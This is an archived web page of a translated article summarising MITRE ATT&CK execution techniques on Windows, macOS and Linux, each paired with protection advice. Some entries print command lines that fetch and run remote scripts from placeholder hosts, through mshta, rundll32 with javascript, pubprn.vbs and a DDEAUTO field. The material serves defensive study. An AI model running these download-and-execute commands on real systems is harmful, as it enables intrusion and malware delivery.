<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We study Adversarial Tactics, Techniques & Common Knowledge (ATT @ CK). Enterprise Tactics. Part 2</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Execution 
 Links to all parts: 
 Part 1. Getting Initial Access 
 Part 2. Execution 
 Part 3. Persistence 
 Part 4. Privilege Escalation 
 Part 5. De...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We study Adversarial Tactics, Techniques & Common Knowledge (ATT @ CK). Enterprise Tactics. Part 2</h1><div class="post__text post__text-html js-mediator-article"><h1>  <a href="https://attack.mitre.org/tactics/TA0002/">Execution</a> </h1><br>  <b>Links to all parts:</b> <br>  <a href="https://habr.com/post/423405/">Part 1. Getting Initial Access</a> <br>  <a href="https://habr.com/post/424027/">Part 2. Execution</a> <br>  <a href="https://habr.com/post/425177/">Part 3. Persistence</a> <br>  <a href="https://habr.com/post/428602/">Part 4. Privilege Escalation</a> <br>  <a href="https://habr.com/post/432624/">Part 5. Defense Evasion</a> <br>  <a href="https://habr.com/post/433566/">Part 6. Obtaining Credential Access</a> <br>  <a href="https://habr.com/ru/post/436350/">Part 7. Discovery</a> <br>  <a href="https://habr.com/ru/post/439026/">Part 8. Lateral Movement (Lateral Movement)</a> <br><br>  The ‚ÄúExecution‚Äù phase describes the use by the attackers of the means and methods of remote and local execution of various commands, scripts, and executable files in the attacked system that were delivered to it in the previous step. <br><a name="habracut"></a><br>  <i>The author is not responsible for the possible consequences of the application of the information contained in the article, and also apologizes for any inaccuracies in some formulations and terms.</i>  <i>The published information is a free recount of the content of <a href="https://attack.mitre.org/wiki/Main_Page">MITER ATT &amp; CK.</a></i> <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1155">AppleScript</a> </h3><br>  <i>System:</i> macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> AppleScript has the ability to work with Apple Event messages that are exchanged between applications within the framework of inter-process communication (IPC).  Using Apple Event, you can interact with almost any application that is open locally or remotely, triggering events such as opening windows and pressing keys.  Scripts are run using the command: <i>Osascript -e &lt;script&gt;</i> . <br>  Attackers can use AppleScript to hide SSH connections to remote hosts in secret, providing fake dialog boxes to users.  AppleScript can also be used in more common types of attacks, such as the Reverse Shell organization. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <i>Security Tips:</i> Mandatory verification of running AppleScript scripts for the signature of a trusted developer. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1191">CMSTP</a> <a href="https://pentestlab.blog/tag/scriptlet/">(AppLocker ByPass - CMSTP)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> <i>Microsoft Connection Manager Profile Installer (cmstp.exe)</i> is the " <i>Connection Manager Profile Installer</i> " built into Windows.  Cmstp.exe can take an inf file as a parameter, so an attacker can prepare a special malicious INF for loading and executing DLLs or scriptlets (* .sct) from remote servers, bypassing AppLocker and other locks, because cmstp.exe is signed with a Microsoft digital certificate. <br><br>  <i>Protection recommendations:</i> Blocking the launch of potentially dangerous applications.  <i>Runs</i> monitoring <i>C: \ Windows \ System32 \ cmstp.exe</i> . <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1059">Command Line Interface (Command-Line Interface)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description: You</i> can interact with the command line interface locally, remotely via remote access software, using Reverse Shell, etc.  Commands are executed with the current permission level of the command-line interface process if the command does not include a process call that changes permissions to execute the command (for example, a scheduled task). <br><br>  <i>Security Tips:</i> Auditing and / or Command Line Blocking Using Tools such as AppLocker or Software Restriction Policies. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1196">Control Panel Items (Windows Control Panel Items)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> The tactic is the use by attackers of Windows Control Panel elements to execute arbitrary commands as a payload (for example, the <i><a href="https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered">Reaver</a></i> virus).  Malicious objects can be disguised as standard controls and delivered to the system using phishing attachments.  Utilities for viewing and configuring Windows settings are registered exe-files and CPL-files of Windows control panel elements.  CPL files are actually renamed DLLs that can be run in the following ways: <br><ul><li>  directly from the command line: <i>control.exe <b>&lt;file.cpl&gt;</b></i> ; </li><li>  using API functions from shell32.dll: <i>rundll32.exe shell32.dll, Control_RunDLL <b>&lt;file.cpl&gt;</b></i> ; </li><li>  double click on the cpl file. </li></ul><br>  Registered CPLs stored in System32 are automatically displayed in the Windows Control Panel and have a unique identifier stored in the registry: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ ControlPanel \ NameSpace</i> <br><br>  Information about other CPLs, for example, the display name and the path to the cpl file are stored in the <i>‚ÄúCpls‚Äù</i> and <i>‚ÄúExtended Properties‚Äù</i> sections of the section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Control Panel</i> <br><br>  Some command line shell CPLs are registered in the section: <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Controls Folder \ <b>{name}</b> \ shellex \ PropertySheetHandlers</i> <br><br>  <i>Protection Recommendation:</i> Limit the launch and storage of control panel item files only in protected folders (for example, <i>C: \ Windows \ System32</i> ), enable User Account Control (UAC) and AppLocker to prevent unauthorized changes to the system.  Of course, the use of anti-virus software. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1173">Dynamic Data Exchange Protocol (DDE),</a> <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">Macro-less Code Exec in MSWord</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> DDE is an application interaction protocol that shares data and shared memory for messaging.  For example, a Word document may contain a table automatically updated from an Excel document.  The technique is to exploit a vulnerability in MS Office applications related to the use of the DDE protocol in MS Office.  Malicious users can embed objects into the MS Office documents that contain commands that will be executed when the document is opened.  For example, a Word document may contain a Field object (Field), in the value of which is specified the <i>{DDEAUTO &lt;command, for example, c: \ windows \ system32 \ cmd.exe&gt;}</i> , which will be executed when the document is opened.  Despite the loss of relevance, DDE can be enabled, including in Windows 10 and MS Office 2016, with the key: <br>  <i>AllowDDE (DWORD)</i> = 2 in the registry key: <br>  <i>HKEY_CURRENT_USER \ Software \ Microsoft \ Office \ <b>&lt;Office version&gt;</b> \ Word \ Security</i> . <br><br>  <i>Security Tips:</i> Follow <i><a href="https://technet.microsoft.com/en-us/library/security/4053440">Microsoft recommendations</a></i> and install the appropriate <i><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021">MS Office update</a></i> .  In Windows 10, you can also enable the <i>Attack Surface Reduction (ASR)</i> parameter to protect against DDE attacks and spawning of child processes by MS Office applications. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1106">Execution through API (Execution through API)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> Attackers can use the API to execute binaries.  API functions such as CreateProcess allow programs and scripts to start processes with an indication of the necessary paths and arguments.  API functions that can be used to execute binaries: <br><ul><li>  CreateProcessA (), CreateProcessW (); </li><li>  CreateProcessAsUserA (), CreateProcessAsUserW (); </li><li>  CreateProcessInternalA (), CreateProcessInternalW (); </li><li>  CreateProcessWithLogonW (), CreateProcessWithTokenW (); </li><li>  LoadLibraryA (), LoadLibraryW (); </li><li>  LoadLibraryExA (), LoadLibraryExW (); </li><li>  LoadModule (); </li><li>  LoadPackagedLibrary (); </li><li>  WinExec (); </li><li>  ShellExecuteA (), ShellExecuteW (); </li><li>  ShellExecuteExA (), ShellExecuteExW (). </li></ul><br><br>  <i>Security</i> Tips <i>:</i> Calls to API functions are common and difficult to distinguish from malicious activity.  The protection vector should be aimed at preventing the attacker from launching tools at the beginning of the attack chain, identifying malicious behavior and blocking potentially dangerous software. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1129">Execution through the Windows module loader (Execution through Module Load)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> It is possible to organize the execution of the code using the Windows module loader - NTDLL.dll, which can load the DLL library on an arbitrary local or network path.  NTDLL.dll is part of the Windows API and can call functions such as <i>CreateProcess ()</i> and <i>LoadLibrary ()</i> . <br><br>  <i>Protection recommendations:</i> Calls to API functions are standard OS functionality that is difficult to distinguish from malicious activity.  The protection vector should be aimed at preventing the launch of the attacker's tools at the beginning of the attack chain.  It makes sense to consider limiting the loading of DLLs with the <i>% SystemRoot%</i> and <i>% ProgramFiles%</i> directories. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1203">Exploitation for Client Execution</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description: The</i> technique involves remote code execution using exploits in user software.  The presence of vulnerabilities in software is often associated with the violation of software requirements of secure programming by software developers, which ultimately leads to the possibility of causing unexpected software behavior. <br>  Consider some types of exploits: <br><ul><li>  Browser exploits.  Web browsers are targeted when malicious users use shadow downloads and phishing links.  The attacked system can be compromised through a normal browser after the user performs certain actions, for example, clicking on the link indicated in the phishing letter. </li><li>  Office application exploits.  Malicious files are transmitted as attachments or download links.  To exploit the vulnerability, the user must open the document or file to launch the exploit. </li><li> Third-party application exploits.  Common applications such as Adobe Reader and Flash, often used in corporate environments, are targeted by intruders.  Depending on the software and the nature of the vulnerability, exploitation of vulnerabilities occurs in the browser or when a user opens a file, for example, Flash objects can be delivered in MS Office documents. </li></ul><br><br>  <i>Protection recommendations:</i> Timely installation of updates used applications.  The use of various means of isolation of potentially vulnerable applications - sandboxes, microsegmentation and virtualization tools, for example, <i><a href="https://www.sandboxie.com/">Sandboxie</a></i> for Windows and Apparmor, Docker for Linux.  It is also recommended to use systems for protection against exploits, for example, <i><a href="https://docs.microsoft.com/ru-ru/windows/security/threat-protection/windows-defender-exploit-guard/windows-defender-exploit-guard">Windows Defender Exploit Guard (WDEG)</a></i> for Windows 10 or <a href="https://support.microsoft.com/ru-ru/help/2458544/the-enhanced-mitigation-experience-toolkit">Enhanced Mitigation Experience</a> <i><a href="https://docs.microsoft.com/ru-ru/windows/security/threat-protection/windows-defender-exploit-guard/windows-defender-exploit-guard">Tool Tool</a></i> <a href="https://support.microsoft.com/ru-ru/help/2458544/the-enhanced-mitigation-experience-toolkit">(EMET)</a> for earlier versions of Windows. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1061">Graphical User Interface</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  Rights: User, administrator, system <br>  <i>Description: An</i> executable file or script is launched when interacting with a file through a graphical user interface (GUI) in an interactive or remote session, for example, using the RDP protocol. <br><br>  <i>Security</i> Tips <i>:</i> Protect credentials that can be used to connect to the system remotely.  Identify unnecessary system utilities, third-party software that can be used to enter interactive remote mode. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1118">InstallUtil</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> InstallUtil is a Windows command line utility that can install and remove applications that comply with the .NET Framework specifications.  Installutil is automatically installed with VisualStudio.  The InstallUtil.exe file is signed with a Microsoft certificate and is stored in: <br>  <i>C: \ Windows \ Microsoft .NET \ Framework \ v [version] \ InstallUtil.exe</i> <br>  Attackers can use the InstallUtil functionality to proxy code execution and bypass application whitelisting. <br><br>  Security Tips <i>:</i> Your InstallUtil may not be used on your system, so consider blocking the launch of InstallUtil.exe. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1177">LSASS Drivers (LSASS Driver)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator, system <br>  <i>Description:</i> Local Security Authority (LSA) is a Windows subsystem that provides user authentication.  LSA includes several dynamic interconnected DLLs that are executed in the LSASS.exe process.  Attackers can attack LSASS.exe by replacing or adding illegitimate LSA drivers and then executing arbitrary code.  The technique is implemented in the Pasam and Wingbird malware, which ‚Äúthrow‚Äù modified DLLs used when loading LSASS.  In this case, the malicious code is executed before an illegitimate DLL causes a crash and a subsequent crash of the LSASS service. <br><br>  <i>Security Tips:</i> In Windows 8.1 and Windows Server 2012 R2, enable LSA protection by setting the registry key: <br>  <i>HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ RunAsPPL</i> <br>  to <i>dword</i> value <i>: 00000001</i> <br><br>  This protection ensures that downloadable LSA plugins and drivers are digitally signed by Microsoft.  In Windows 10 and Server 2016, enable <i><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage">Windows Defender Credential Guard</a></i> to run lsass.exe in an isolated virtual environment.  Enable the safe DLL search mode to reduce the risk of malicious libraries loading into lsass.exe: <br>  <i>HKEY_LOCAL_MACHINE \ System \ CurrentControlSet \ Control \ Session Manager \ SafeDllSearchMode</i> . <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1152">Launchctl</a> </h3><br>  <i>System:</i> macOS <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Launchctl is a utility for managing Launchd service.  With Launchctl, you can manage system and user services (LaunchDeamons and LaunchAgents), as well as execute commands and programs.  Launchctl supports command line subcommands, interactive or redirected from standard input: <br>  <i>launchctl submit -l [labelname] - / Path / to / thing / to / execute '' arg "'' arg" '' arg "</i> . <br>  By launching and restarting services and daemons, attackers can execute code and even bypass the whitelist if the launchctl is an allowed process, but loading, unloading and reloading services and daemons may require elevated privileges. <br><br>  Security Tips <i>:</i> Restricting users to create Launch Agents and launch Launch Deamons using Group Policy.  Using the <i>KnockKnock</i> app, <i>you</i> can discover programs that use launchctl to manage Launch Agents and Launch Deamons. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1168">Execution using local scheduling tasks (Local Job Scheduling)</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User, administrator, root <br>  <i>Description:</i> Attackers can create tasks in the attacked systems for unauthorized launch of programs when the system is booted or on a schedule.  On Linux and Apple systems, several methods for scheduling periodic background tasks are supported: cron, at, launchd.  Unlike Windows Task Scheduler, task scheduling on Linux systems cannot be performed remotely, except for using remote sessions like SSH. <br><br>  <i>Protection recommendations:</i> Restricting user rights to create scheduled tasks, blocking system utilities and other software that can be used to schedule tasks. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1170">Mshta</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Mshta.exe (located in <i>C: \ Windows \ System32 \</i> ) is a utility that executes Microsoft HTML applications (* .HTA).  HTA applications are run using the same technologies that InternetExplorer uses, but outside of the browser.  Due to the fact that Mshta processes files bypassing browser security settings, attackers can use mshta.exe to proxy malicious HTA files, Javascript or VBScript.  You can run the malicious file through the built-in script: <br>  <i>mshta vbscript: Close (Execute ("GetObject (" "script: https [:] // webserver / payload [.] sct" "))))</i> <br><br>  or directly to the URL: <br>  <i>mshta http [:] // webserver / payload [.] hta</i> <br><br>  <i>Security</i> Tips <i>:</i> The mshta.exe functionality is associated with older versions of IE that have reached the end of their life cycle.  Block Mshta.exe if you are not using its functionality. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1086">Powershell</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> PowerShell (PS) is a powerful interactive command-line interface and scripting environment included with Windows.  Attackers can use PS to gather information and execute code.  For example, the Start-Process cmdlet can start an executable file, the Invoke-Command cmdlet will execute a command locally or on a remote computer.  PS can also be used to download and run executable files from the Internet, without saving them to your hard drive.  For remote connections using PS, administrative rights are required.  There are a number of tools for attacking PS: <br><ul><li>  <i><a href="https://github.com/EmpireProject/Empire">Empire</a></i> </li><li>  <i><a href="https://github.com/PowerShellMafia/PowerSploit">Powersploit</a></i> </li><li>  <i><a href="https://github.com/jaredhaight/PSAttack">PSAttack</a></i> </li></ul><br>  <i>Protection tips:</i> PS can be removed from the system if it is not necessary.  If PS is required, then you should limit the ability of administrators to run it and only execute signed scripts.  Disable the WinRM service to prevent remote execution of PS scripts.  It should be noted that there are <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">methods for circumventing the policies for executing PS scripts</a> . <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1121">Regsvcs / Regasm</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Regsvcs and Regasm are Windows utility utilities used to register in the .NET Component Object Model (COM) assembly system.  Both files are digitally signed by Microsoft.  Criminals can use Regsvcs and Regasm to proxy code when the code that must be run before registering or unregistering is specified as an attribute: [ComRegisterFunction] or [ComUnregisterFunction].  The code with such attributes can be run even if the process is executed with insufficient privileges or even ‚Äúcrashes‚Äù at startup. <br><br>  <i>Security</i> Tips <i>:</i> Block Regsvcs.exe and Regasm.exe if they are not used on your system or network. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1117">Regsvr32</a> <a href="https://www.anti-malware.ru/news/2018-03-15-1447/25725%25E2%2580%258B">(Squiblydoo)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator <br>  <i>Description:</i> Regsvr32.exe is a console utility for registering and unregistering OLE controls in the registry, for example, ActiveX and DLL libraries.  Regsvr32.exe is digitally signed by Microsoft and can be used to proxy code execution.  For example, using Regsvr32, you can load an XML file that contains pieces of Java code (scriptlets) that will be performed to bypass the white list. <br><br>  <i>Protection Recommendations:</i> Attack Surface Reduction (ASR) in EMET and Advanced Theart Protection in Windows Defender can block the use of Regsvr32.exe to bypass white lists. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1085">Rundll32</a> <a href="https://www.symantec.com/security-center/writeup/2014-080408-5614-99%25E2%2580%258B">(Poweliks)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Rundll32.exe is a system utility for running programs in dynamic link libraries that can be invoked to proxy a binary file, execute Windows control files (.cpl) through the undocumented functions of shel32.dll - <i>Control_RunDLL</i> and <i>Control_RunDLLAsUser</i> .  Double-clicking on the .cpl file also causes Rundll32.exe to execute.  Rundll32 can also be used to execute scripts such as javascript: <br>  <i>rundll32.exe javascript: "\ .. \ mshtml, RunHTMLApplication"; document.write (); GetObject ("scrirpt: https [:] // www [.] example [.] com / malicious.sct") "</i> <br>  The above described method of using rundll32.exe is detected by antivirus software like a virus like Poweliks. <br>  Protection Tips: Attack Surface Reduction (ASR) in EMET and Advanced Theart Protection in Windows Defender can block the use of Rundll32.exe to bypass white lists. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1053">Running with Windows task scheduling (Scheduled Task)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> Utilities such as at, schtasks and Windows Task Scheduler can be used to schedule the launch of programs and scripts that will be executed at a specific date and time.  The task can be scheduled on the remote system, provided that RPC is used for authentication and printer and file sharing is enabled.  In addition, administrator scheduling is required to schedule tasks on the remote system.  Malicious users can use remote task scheduling to execute programs at system startup or in the context of a specific account. <br><br>  <i>Recommendations on protection:</i> Enable the restriction of rights to create tasks by users on behalf of System in the registry: <br>  <i>HKLM \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ SubmitControl = 0</i> <br>  <i>Note:</i> SubmitControl = 1 will allow the creation of tasks for members of the Server Operators group. <br><br>  Also perform the appropriate GPO configuration: <br>  <i>Computer Configuration&gt; [Policies]&gt; Windows Settings&gt; Security Settings&gt; Local Policies&gt; Security Options:</i> <br>  <i>Computer Configuration&gt; [Policies]&gt; Windows Settings&gt; Security Settings&gt; Local Policies&gt; Increase scheduling priority</i> <br>  Consider the feasibility of using the PowerSploit Framework, which contains the PowerUP module for finding vulnerabilities in scheduled task permissions, in its activities. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1064">Scripting</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> Attackers can use scripts to automate their actions, speed up operational tasks and, as a result, reduce the time needed to gain access.  Some scripting languages ‚Äã‚Äãcan be used to bypass the process monitoring mechanisms by directly interacting with the OS at the API level instead of calling other programs.  Scripts can be embedded in Office documents as macros and then used for a phishing attack.  In this case, the attackers are counting on the user launching a file with a macro or that the user agrees to activate the macro.  There are several popular scripting frameworks - Metasploit, Veil, PowerSploit. <br><br>  <i>Security Tips:</i> Restrict access to scripts such as VBScript or PowerShell.  On Windows, configure MS Office security settings by enabling secure viewing and disabling macros via GPO.  If macros are needed, then allow only signed, digitally signed macros to run.  Use microsegmentation and application virtualization, for example, Sandboxie for Windows and Apparmor, Docker for Linux. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1035">Start of services (Service Execution)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Administrator, System <br>  <i>Description:</i> Attackers can execute a binary code, command, or script using special methods of interacting with Windows services, for example, using <i>the Service Control Manager (SCM),</i> you can create new services and modify running ones. <br><br>  <i>Protection recommendations:</i> Make sure that the current setting of rights in the system prohibits low privilege users from starting services with high privileges.  Make sure that executable files with high permissions in the system cannot be replaced or modified by users with lower permissions.  Consider the use of tools to restrict the launch of potentially dangerous programs using AppLocker and setting software restriction policies ( <i><a href="https://technet.microsoft.com/en-us/library/2008.06.srp.aspx">Software Restriction Policies</a></i> ). <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1218">Execution through signed binaries (Signed Binary Proxy Execution)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> User <br>  <i>Description:</i> Binary files signed with trusted digital certificates can run on Windows systems that are protected by digital signature verification.  Several default Microsoft signed files when installing Windows can be used to proxy other files to run: <br>  <b>Mavinject.exe</b> is a Windows utility that allows you to execute code.  Mavinject can be used to enter a DLL into a running process: <br>  <i>"C: \ Program Files \ Common Files \ microsoft shared \ ClickToRun \ MavInject32.exe" [PID] / INJECTRUNNING [PATH DLL]</i> <br>  <i>C: \ Windows \ system32 \ mavinject.exe [PID] / INJECTRUNNING [PATH DLL]</i> <br>  <b>SyncAppvPublishingServer.exe</b> - can be used to run powershell scripts without running powershell.exe. <br>  There are <i><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">several similar binaries</a></i> . <br><br>  <i>Security Tips:</i> Many signed files may not be used on your system, so consider blocking their launch. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1216">Execution through signed scripts (Signed Script Proxy Execution)</a> </h3><br>  <i>System:</i> Windows <br>  <i>Rights:</i> Users <br>  <i>Description:</i> Scripts signed with trusted certificates can be used to proxify malicious files, for example, the <i>PubPrn.vbs</i> file <i>is</i> signed with a Microsoft certificate and can be used to launch a file from a remote server: <br>  <i>cscript C: \ Windows \ System32 \ Printing_Admin_Scripts \ en-RU \ pubprn.vbs 127.0.0.1 script: http [:] // 192.168.1.100/hi.png</i> <br><br>  <i>Security Tips:</i> Such signed scripts may not be required on your system, so consider blocking their launch. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1153">Source Team</a> </h3><br>  <i>System:</i> Linux and macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> Source is a command that allows you to read and execute all commands from the specified file in the current command shell, which means that all specified environment variables will be visible in all scripts and commands that will be launched.  Source can be run in two ways: <br>  <i>source / path / to / filename [arguments]</i> or <i>.</i>  <i>/ path / to / filename [arguments]</i> <br>  Note the space after the dot.  Without a space, the program will run in a new command shell.  Attackers can use Source to execute files unlabeled with the ‚Äúx‚Äù flag as executable. <br><br>  <i>Protection recommendations:</i> Preventing the use of built-in commands in the system is rather difficult due to their legality, so the protection vector must be directed to preventing malicious actions at earlier stages of an attack, for example, at the delivery stage or creating a malicious file in the system. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1151">Space after file name (Space after Filename)</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User <br>  <i>Description:</i> Attackers can hide the true file type by changing its extension.  With certain file types (does not work with .app files), adding a space character to the end of the file name will change the way the operating system processes the file.  For example, if there is a Mach-O executable file called evil.bin, then when the user double-clicks the OS, he will start Terminal.app and execute it.  If the same file is renamed to evil.txt, then double-click it to start in a text editor.  However, if the file is renamed to ‚Äúevil.txt‚Äù (space at the end), then when you double-click the type of the true file, the OS will be determined and the binary file will start.  Attackers can use this technique to deceive the user and launch a malicious executable file. <br><br>  <i>Protection recommendations:</i> The use of this technique is difficult to prevent, since  An attacker uses standard operating system mechanisms, so the protection vector must be directed at preventing malicious actions at earlier stages of the attack, for example, at the delivery stage or creating a malicious file in the system. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1072">Run with third-party network administration software (Third-party Software)</a> </h3><br>  <i>System:</i> Windows, Linux, macOS <br>  <i>Rights:</i> User, Administrator, System <br>  <i>Description:</i> The attack vector is directed to third-party software and software deployment systems that are used in the attacked network for administration needs (SCCM, VNC, HBSS, Altris, etc.).  If an intruder gains access to such systems, the adversary gains the ability to remotely execute code on all the hosts connected to the software deployment system.  The rights required to implement this technology depend on the specific configuration of the systems.  Local credentials may be sufficient to access the software deployment server, but an administrator account may be required to run the software deployment. <br><br>  Security Tips <i>:</i> Check the security level of your software deployment systems.  Ensure that access to software management systems is limited, controlled and protected.  Strictly enforce mandatory prior approval policies for remote software deployment.  Provide access to software deployment systems to a limited number of administrators, ensure isolation of the software deployment system.  Make sure that the access credentials for the software deployment system are unique and not used in other services on the corporate network.  If the software deployment system is configured to run only signed binaries, then verify that trusted certificates are not stored in the software deployment system itself, but are located in a system that cannot be accessed remotely. <br><br><h3>  <a href="https://attack.mitre.org/wiki/Technique/T1154">Trap Team</a> </h3><br>  <i>System:</i> Linux, macOS <br>  <i>Rights:</i> User, Administrator <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> The trap command is used to protect the script from interruptions (ctrl + c, ctrl + d, ctrl + z, etc.). If the script receives an interrupt signal specified in the arguments of the trap command, then it processes the interrupt signal itself, and the command shell will not process such a signal. Attackers can use trap to register code that will be executed when the shell receives certain interrupt signals. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Protection recommendations:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> The use of this technique is difficult to prevent, because the attacker uses regular operating system mechanisms. The protection vector should be directed to the prevention of malicious actions at earlier stages of an attack, for example, at the delivery stage or the creation of a malicious file in the system.</font></font><br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1127"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execution through trusted software development utilities (Trusted Developer Utilities)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rights:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> User </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> There are many utilities that are used by software developers and which can be used to execute code in various forms during software development, debugging and reverse engineering. </font><font style="vertical-align: inherit;">These utilities are often signed with digital certificates that allow them to perform malicious code proxying in the OS, bypassing the protection mechanisms and white sheets of applications. </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: 